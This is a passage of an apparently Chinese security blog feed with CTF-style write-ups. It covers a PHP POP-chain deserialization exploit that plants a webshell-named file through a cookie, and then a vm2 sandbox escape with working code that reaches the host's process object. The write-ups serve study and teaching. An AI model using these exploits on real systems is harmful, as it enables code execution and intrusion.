if($this-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而但对于魔术方法__call()，要对象调用不可访问的函数才可以被调用，所以可以利用register.php文件中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">    if(!$this-&gt;registed)&#123;</span><br><span class="line">        $this-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只需将$this-&gt;checker设置为new Profile()，即可触发__call()魔术方法，而__call()魔术方法中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;&#123;$name&#125;</span><br></pre></td></tr></table></figure><p>则会触发__get()魔术方法，而将$this-&gt;except=array[“index”=&gt;”upload_img”]，则可以利用return $this-&gt;except[$name]调用upload_img()函数，从而实现覆盖，所以exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Profile</span><br><span class="line">&#123;</span><br><span class="line">    public $checker=0;  //绕过upload_tmp()函数的第一个if</span><br><span class="line">    public $filename_tmp=&quot;./upload/93df0602d768e80cec04f22bc0fb368d/432958539d6bd005179f8a48cb4ef719.png&quot;;</span><br><span class="line">    public $filename=&quot;upload/penson.php&quot;;</span><br><span class="line">    public $upload_menu;</span><br><span class="line">    public $ext=1; //绕过第二个if</span><br><span class="line">    public $img;</span><br><span class="line">    public $except=array(&quot;index&quot;=&gt;&quot;upload_img&quot;);</span><br><span class="line"></span><br><span class="line">    public function upload_img()&#123;</span><br><span class="line">        if($this-&gt;checker)&#123;</span><br><span class="line">            if(!$this-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;;</span><br><span class="line">                $this-&gt;redirect($curr_url,302);</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_FILES))&#123;</span><br><span class="line">            $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;;</span><br><span class="line">            $this-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        if($this-&gt;ext) &#123;</span><br><span class="line">            if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy($this-&gt;filename_tmp, $this-&gt;filename);</span><br><span class="line">                @unlink($this-&gt;filename_tmp);</span><br><span class="line">                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;</span><br><span class="line">                $this-&gt;update_img();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Register&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $registed=0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Register();</span><br><span class="line">$a-&gt;checker=new Profile();</span><br><span class="line">$a-&gt;checker-&gt;checker=0;//调用pop链防止退出程序</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后我们只要抓包，然后将这个生成的值放入cookie的参数user中即可</p><p>参考文章：[<a href="https://blog.csdn.net/mochu7777777/article/details/105131257]">https://blog.csdn.net/mochu7777777/article/details/105131257]</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pop链3之-get-和-call-魔术方法的使用&quot;&gt;&lt;a href=&quot;#pop链3之-get-和-call-魔术方法的使用&quot; class=&quot;headerlink&quot; title=&quot;pop链3之__get()和__call()魔术方法的使用&quot;&gt;&lt;/a&gt;pop链3之_</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>vm2沙箱逃逸</title>
    <link href="http://example.com/2021/10/12/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>http://example.com/2021/10/12/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</id>
    <published>2021-10-11T16:00:00.000Z</published>
    <updated>2021-10-12T17:55:56.382Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vm2沙箱逃逸"><a href="#vm2沙箱逃逸" class="headerlink" title="vm2沙箱逃逸"></a>vm2沙箱逃逸</h1><h2 id="vm2-API"><a href="#vm2-API" class="headerlink" title="vm2 API"></a>vm2 API</h2><h3 id="proxy代理"><a href="#proxy代理" class="headerlink" title="proxy代理"></a>proxy代理</h3><p>proxy用于修改某些操作的默认行为，等同于在语言层面做出修改，所以属于一种”元编程”，即对编程语言进行编程，可以理解成在目标对象之前架设一层”拦截”，外界对该对象进行访问时，都必须先通过这层拦截，因此提供一种机制，可以对外界的访问进行过滤和改写，这种操作可以被称为”代理器”</p><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var obj = new Proxy(&#123;&#125;, &#123;</span><br><span class="line">  get: function (target, propKey, receiver) &#123;</span><br><span class="line">    console.log(`getting $&#123;propKey&#125;!`);</span><br><span class="line">    return Reflect.get(target, propKey, receiver);</span><br><span class="line">  &#125;,</span><br><span class="line">  set: function (target, propKey, value, receiver) &#123;</span><br><span class="line">    console.log(`setting $&#123;propKey&#125;!`);</span><br><span class="line">    return Reflect.set(target, propKey, value, receiver);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码相当于对一个空对象架设了一层拦截，对属性的读取(get)和设置(set)行为进行重新的定义，如果对obj里的属性进行读取或设置的话，就会有以下的结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj.count=1; //结果为：setting count!</span><br><span class="line"></span><br><span class="line">obj.count;   //结果为：getting count!</span><br></pre></td></tr></table></figure><p>从结果中，我们可以知道对obj里的属性的读取和设置都进行了拦截</p><p>而ES6原生提供的Proxy构造函数，用来生成Proxy实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var proxy=new Proxy(target,handler);</span><br></pre></td></tr></table></figure><p>其中new Proxy()表示生成一个Proxy实例，而target参数表示要拦截的目标对象，handler参数也是一个对象，用来定制拦截行为</p><p>当然有一个技巧是将Proxy对象，设置到object.proxy属性，从而可以在object对象上调用，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var object=&#123;proxy:new Proxy(target,handler)&#125;;</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var proxy = new Proxy(&#123;&#125;, &#123;</span><br><span class="line">  get: function(target, propKey) &#123;</span><br><span class="line">    return 35;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">let obj = Object.create(proxy);</span><br><span class="line">obj.time // 35</span><br></pre></td></tr></table></figure><p>proxy对象是obj对象的模型，而由于obj对象本身并没有time属性，所以根据原型链，会在proxy对象上读取该属性，导致被拦截</p><p>同一个拦截函数可以设置多个拦截操作，一共13种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">get(target,propKey,receiver)：拦截对象属性的读取</span><br><span class="line"></span><br><span class="line">set(target,propKey,value,receiver)：拦截对象属性的设置</span><br><span class="line"></span><br><span class="line">has(target,propKry)：拦截propKey in proxy的操作，返回一个布尔值</span><br><span class="line"></span><br><span class="line">deleteProperty(target, propKey)：拦截delete proxy[propKey]的操作，返回一个布尔值。</span><br><span class="line"></span><br><span class="line">ownKeys(target)：拦截Object.getOwnPropertyNames(proxy)、Object.getOwnPropertySymbols(proxy)、Object.keys(proxy)、for...in循环，返回一个数组</span><br><span class="line"></span><br><span class="line">getOwnPropertyDescriptor(target, propKey)：拦截Object.getOwnPropertyDescriptor(proxy, propKey)，返回属性的描述对象</span><br><span class="line"></span><br><span class="line">defineProperty(target, propKey, propDesc)：拦截Object.defineProperty(proxy, propKey, propDesc）、Object.defineProperties(proxy, propDescs)，返回一个布尔值</span><br><span class="line"></span><br><span class="line">preventExtensions(target)：拦截Object.preventExtensions(proxy)，返回一个布尔值。</span><br><span class="line"></span><br><span class="line">getPrototypeOf(target)：拦截Object.getPrototypeOf(proxy)，返回一个对象</span><br><span class="line"></span><br><span class="line">isExtensible(target)：拦截Object.isExtensible(proxy)，返回一个布尔值。</span><br><span class="line"></span><br><span class="line">setPrototypeOf(target, proto)：拦截Object.setPrototypeOf(proxy, proto)，返回一个布尔值</span><br><span class="line"></span><br><span class="line">apply(target, object, args)：拦截 Proxy 实例作为函数调用的操作</span><br><span class="line"></span><br><span class="line">construct(target, args)：construct(target, args)</span><br></pre></td></tr></table></figure><h3 id="vm2实现原理"><a href="#vm2实现原理" class="headerlink" title="vm2实现原理"></a>vm2实现原理</h3><p>vm2的代码有四个主要文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cli.js：实现vm2的命令行调用</span><br><span class="line"></span><br><span class="line">contextify.js：封装了三个对象，Contextify和Decontextify，并且针对global的Buffer类进行代理</span><br><span class="line"></span><br><span class="line">main.js：vm2执行的入口，导出了nodeVM，VM这两个沙箱环境，还有一个VMSCript实际上是封装了vm.Script</span><br><span class="line"></span><br><span class="line">sandbox.js：针对global的一些函数和变量进行了hook，如:setTimeout，setInterval等</span><br><span class="line"></span><br><span class="line">vm2利用es6新增的proxy特性来拦截对constructor和__proto__这些属性的访问</span><br><span class="line"></span><br><span class="line">实例</span><br></pre></td></tr></table></figure><p>const {VM, VMScript} = require(“vm2”);</p><p>const script = new VMScript(“let a = 2;a”);</p><p>let vm = new VM();</p><p>console.log(vm.run(script));  //2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行代码的实现</span><br></pre></td></tr></table></figure><p>首先，new VMScript(“let a=2;a”)会调用vm.Script编译代码为script</p><p>然后，let vm=new VM()会调用vm,createContext创建一个上下文context，然后引入sandbox.js将其封装为一个匿名函数anonymous，之后调用封装的匿名函数anonymous，绑定其中的this为context</p><p>最后vm.run(script)会调用vm.runInContext在上下文的context中运行script</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">而且当我们创建VM的对象时，vm2内部会引入contextify.js，针对vm.createContext创建的上下文作为参数传入，并且vm的api会将contextify.js封装为一个匿名函数</span><br></pre></td></tr></table></figure><pre><code>    Reflect.defineProperty(this, &#39;_internal&#39;, &#123;        value: vm.runInContext(`(function(require, host) &#123; $&#123;cf&#125; n&#125;)`, this._context, &#123;            filename: `$&#123;__dirname&#125;/contextify.js`,            displayErrors: false        &#125;).call(this._context, require, host)    &#125;);</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">其中对于封装为匿名函数的contextify.js会先定义vm2的一些常量，并且会在global和this上添加了相应的属性</span><br></pre></td></tr></table></figure><p>// eslint-disable-next-line no-invalid-this, no-shadow<br>const global = this;</p><p>// global is originally prototype of host.Object so it can be used to climb up from the sandbox.<br>Object.setPrototypeOf(global, Object.prototype);</p><p>Object.defineProperties(global, {<br>    global: {value: global},<br>    GLOBAL: {value: global},<br>    root: {value: global},<br>    isVM: {value: true}<br>});</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">虽然是在函数体外部写了return语句，所以webstrom报错，但是实际上这串代码还是会封装在函数中的</span><br></pre></td></tr></table></figure><p>return{<br>    Contextify,<br>    Decontextify,<br>    Buffer:LocalBuffer<br>};</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其中的Contextify和Decontextify都是两个weakmap，而weakmap是es6新增的语法，只接受对象作为键名，并且这些对象是不会被计入垃圾回收机制的，这是防止内存泄露，而这是用来存储已经被代理过的对象的</span><br><span class="line"></span><br><span class="line">而Contextify.readonly 做了些什么</span><br></pre></td></tr></table></figure><p>const LocalBuffer = global.Buffer = Contextify.readonly(host.Buffer, {<br>    allocUnsafe: function allocUnsafe(size) {<br>        return this.alloc(size);<br>    },<br>    allocUnsafeSlow: function allocUnsafeSlow(size) {<br>        return this.alloc(size);<br>    }<br>});</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">而对于整个匿名函数调用的顺序是</span><br></pre></td></tr></table></figure><p>”global.Buffer=“—-&gt;“cobtextify.readonly”—-&gt;“contextify.value”—-&gt;contextify.value“—-&gt;”contextify.function“—-&gt;”contextify.object“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从匿名函数的调用过程，我们可以看见最后它返回的是代理对象，而且还会做一个object.assign的操作，即将所有可枚举属性的值从一个或多个源对象复制到目标对象，然后返回目标对象，如</span><br></pre></td></tr></table></figure><p>const target = { a: 1, b: 2 };<br>const source = { b: 4, c: 5 };</p><p>const returnedTarget = Object.assign(target, source); // Object { a: 1, b: 4, c: 5 }</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可见source的b会覆盖target的b，而覆盖的1优先级是</span><br></pre></td></tr></table></figure><p> deepTraps &gt; traps &gt; {get:…, set: …}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">最终会得到Buffer代理对象，而它本身仍然是nodejs提供的，只是vm2加了一层代理，所以在vm2的沙箱中访问它的属性时会被设定的方法拦截，而且Contextify.object 内部还使用了 WeakMap 来存储已经代理过的对象和对象的代理，所以在vm2沙箱环境中，如果是内部的对象，由于vm的实现机制保证了内部定义的对象无法逃逸，而对于外部引入的对象，由于vm2提供的代理机制会拦截constructor等属性的访问，从而保证这个沙箱的安全</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line">在main.js编写如下代码</span><br></pre></td></tr></table></figure><p>const {VM, VMScript} = require(‘vm2’);<br>const fs = require(‘fs’);<br>const file = <code>$&#123;__dirname&#125;/sandbox.js</code>;</p><p>// By providing a file name as second argument you enable breakpoints<br>const script = new VMScript(fs.readFileSync(file), file);</p><p>console.log(new VM().run(script));</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在sandbox.js中编写</span><br></pre></td></tr></table></figure><p>let a = Buffer.from(“”); //访问Buffer的from属性并调用<br>a.i = () =&gt; {}; //给对象添加属性<br>console.log(a.i); //访问对象的属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">上面已经写了Buffer是一个代理的对象，访问其所有的属性都会被拦截，而let a=Buffer.from(&quot;&quot;);代码的调用过程</span><br></pre></td></tr></table></figure><p>Buffer.from—-&gt;代理的get拦截—-&gt;contextify.value—-&gt;contextify.function—-&gt;contextify.object</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们从调用过程中可以看见Buffer代理对象访问其from属性，然后被代理的get方法拦截，经过层层调用后，会返回一个函数的代理对象，而这个代理对象会被当作函数调用，会被apply捕获，apply拦截方法</span><br></pre></td></tr></table></figure><p>apply: (target, context, args) =&gt; {<br>    try {<br>        context = Decontextify.value(context);</p><pre><code>    // Set context of all arguments to host&#39;s context.    return Contextify.value(fnc.apply(context, Decontextify.arguments(args)));&#125; catch (e) &#123;    throw Contextify.value(e);&#125;</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后apply拦截方法的调用过程</span><br></pre></td></tr></table></figure><p>Buffer.from(“”)—&gt;代理apply拦截—&gt;Decontextify.value(context)对上下文解封装—&gt;Decontextify.arguments(args)对参数解封装—&gt;apply函数调用—&gt;contextify.value对得到的结果封装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里调用了Decontextify.value，实际上Decontextify的实现和contextify是对称的，只是有点略微的不同，而Decontextify.value首先会检查contextified中是否有这个对象，如果有则直接返回，没有则加一层代理</span><br><span class="line"></span><br><span class="line">从这个函数的调用，我们知道vm2针对很多对象做了代理，但是实际调用一次函数时，会将代理的&quot;外壳&quot;给剥除掉，并且必须依靠nodejs提供的api来完成，如果我们可以捕获这个对象，我们就完成vm2的逃逸</span><br><span class="line"></span><br><span class="line">之后还会执行</span><br></pre></td></tr></table></figure><p>a.i=()=&gt;{};</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此时会被代理的se方法拦截</span><br><span class="line"></span><br><span class="line">此时的value是一个函数，Decontextify.value 针对其进行了封装，返回一个函数的代理对象，就是说a.i为一个函数的代理对象，而且这个函数的代理对象中</span><br></pre></td></tr></table></figure><p>constructor属性返回的会是host.function</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以当我们执行最后一行代码时</span><br></pre></td></tr></table></figure><p>console.log(a.i);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">会被代理的get方法拦截，但是vm2的作者通过contextify.value取出被代理之前的对象，最终还是得到原来的函数，所以无法获得被代理的函数对象</span><br><span class="line"></span><br><span class="line">## vm2沙箱逃逸的原理</span><br><span class="line"></span><br><span class="line">有两种逃逸方法</span><br><span class="line"></span><br><span class="line">### 第一种vm2逃逸方法</span><br><span class="line"></span><br><span class="line">它在proxy机制中没有定义has方法，所以我们可以在外部定义has方法，从而让它在触发has方法时调用外部的has方法，而在外部的has方法中可以通过</span><br></pre></td></tr></table></figure><p>process = t.constructor(“return process”)();</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">来访问原型链中的construct属性，从而获得function，使用内置函数执行恶意代码</span><br><span class="line"></span><br><span class="line">我们可以通过这个例子来理解一下has方法的触发</span><br></pre></td></tr></table></figure><p>var handler = {<br>    get () {<br>     console.log(“get”);<br>    }<br>  };</p><p>  var target = {};</p><p>  var proxy = new Proxy(target, handler);</p><p>  Object.prototype.has = function(){<br>    console.log(“has”);<br>  }</p><p>  proxy.a; //触发get<br>  “” in proxy; //触发has，这个has是在原型链上定义的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可见在对象target定义了get操作，所以当时使用proxy.a时会打印出get，而当&quot;&quot; in proxy时，由于target对象中没有直接定义has进行拦截，所以会调用外部的has拦截，从而输出has</span><br><span class="line"></span><br><span class="line">案例1</span><br></pre></td></tr></table></figure><p>var handler = {<br>    get () {<br>     console.log(“get”);<br>    }<br>  };</p><p>  var target = {};</p><p>  var proxy = new Proxy(target, handler);</p><p>  Object.prototype.has = function(){<br>    console.log(“has”);<br>  }</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于Buffer.from是一个代理对象，但是在vm2内部的Object中没有has方法，所以我们可以自己给Object对象的原型中添加has方法，这时候运行</span><br></pre></td></tr></table></figure><p>“” in Buffer.from</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">就会执行我们自定义的has方法，由于proxy机制，参数t为function Buffer.from，而这个function时在外部，其上下文是 nodejs 的global下，所以访问其 constructor 属性就获取到了外部的 Function，从而拿到外部的 process</span><br><span class="line"></span><br><span class="line">修补方法是在Buffer.from中加入has方法，就不会在原型链中查找constructor 属性</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 第二种vm2逃逸方法</span><br><span class="line"></span><br><span class="line">我们可以利用Object.defineProperty来设置对象的访问器属性</span><br><span class="line"></span><br><span class="line">就是本来代码</span><br></pre></td></tr></table></figure><p>var obj = {<br>    prop: let obj = {<br>    prop:123,<br>    Writable: true<br>}</p><p>let jbo = {<br>    get prop(){<br>        return “get”;<br>    },<br>    set prop(val){<br>        console.log(“set”+val);<br>    }<br>}</p><p>console.log(obj.prop); //123<br>console.log(jbo.prop); //get</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">但是我们可以利用Object.defineProperty</span><br></pre></td></tr></table></figure><p>let obj = {};<br>Object.defineProperty(obj, “prop”, {<br>    get get(){<br>        console.log(“get1”); //get1<br>        return ()=&gt;{return “get2”};<br>    }<br>})<br>console.log(obj.prop); //get2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此时会先执行get()函数，打印出get1，返回一个函数，作为prop属性的getter，之后访问obj.prop会打印出get2，然后我们再看vm2逃逸的代码</span><br></pre></td></tr></table></figure><p>var process;<br>try {<br>    let a = Buffer.from(“”)<br>    Object.defineProperty(a, “”, {<br>        get set() {<br>            Object.defineProperty(Object.prototype, “get”, {<br>                get: function get() {<br>                    throw function (x) {<br>                        return x.constructor(“return process”)();<br>                    };<br>                }<br>            });<br>            return ()=&gt;{};<br>        }</p><pre><code>&#125;);</code></pre><p>} catch (e) {<br>    process = e(() =&gt; {});<br>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行的过程</span><br></pre></td></tr></table></figure><pre><code>                  同时”异步执行在Object.prototype上添加get属性“                                                                   /</code></pre><p>“Buffer.from(“”)返回一个代理对象a”—&gt;”Object.defineProperty在a上添加属性，被代理的defineProerty拦截“–&gt;vm2内部访问到Object.prototype.get时”—&gt;”vm2内部抛出异常并被捕获“–&gt;“vm2再次抛出异常e”—&gt;”捕获vm2内部的异常“–&gt;执行e(()=&gt;{})逃逸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此时a是一个代理对象，当我们在a上定义新属性时会被defineProperty拦截，而在defineProperty中有一串代码会检测descriptor上是否设置了get和set，如果是，则会调用外部的host.Object.defineProperty 去实现设置对象属性</span><br><span class="line"></span><br><span class="line">但是在执行decriptor.get时，由于nodejs是异步的，所以会触发</span><br></pre></td></tr></table></figure><p>Object.defineProperty(Object.prototype, “get”, {<br>                get: function get() {<br>                    throw function (x) {<br>                        return x.constructor(“return process”)();<br>                    };<br>                }<br>            });</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">抛出异常</span><br></pre></td></tr></table></figure><p>throw x=&gt;x.constructor(“return process”)();</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">而这个异常会被vm2内部捕获，就是这里的e</span><br></pre></td></tr></table></figure><p>}catch(e){<br>    throw Contextify.value(e);<br>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后vm2会将这个抛出的异常包装成一个代理对象之后，继续抛出，最后被我们的代码捕获</span><br></pre></td></tr></table></figure><p>}catch(e){<br>    let k=()=&gt;{};<br>    process=e(k);<br>}<br>然后会将其作为函数来调用，就会触发这个函数代理对象的apply方法，此时apply方法中的target为x=&gt;x.constructor(‘return process’)()，context是函数的上下文代理，通过Decontextify.value 之后是 underfined，然后args是函数的参数代理，其值为()=&gt;{}，然后会先将函数的参数进行一次处理，然后反射调用函数，并将得到结果包装成代理对象，即函数的参数()=&gt;{}是一个函数，不是代理对象，所以decontextify将其做了一次包装后，成为一个代理对象，然后这个代理对象触发get方法后的constructor属性返回host.function，所以导致了沙箱逃逸</p><h2 id="实例just-escape"><a href="#实例just-escape" class="headerlink" title="实例just escape"></a>实例just escape</h2><p>打开页面，发现有提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/run.php?code=(2%2b6-7)/3</span><br><span class="line"></span><br><span class="line">/run.php?code=new%20Date()</span><br></pre></td></tr></table></figure><p>然后构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/run.php</span><br></pre></td></tr></table></figure><p>发现有源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;code&#x27; ] != NULL ) &#123;</span><br><span 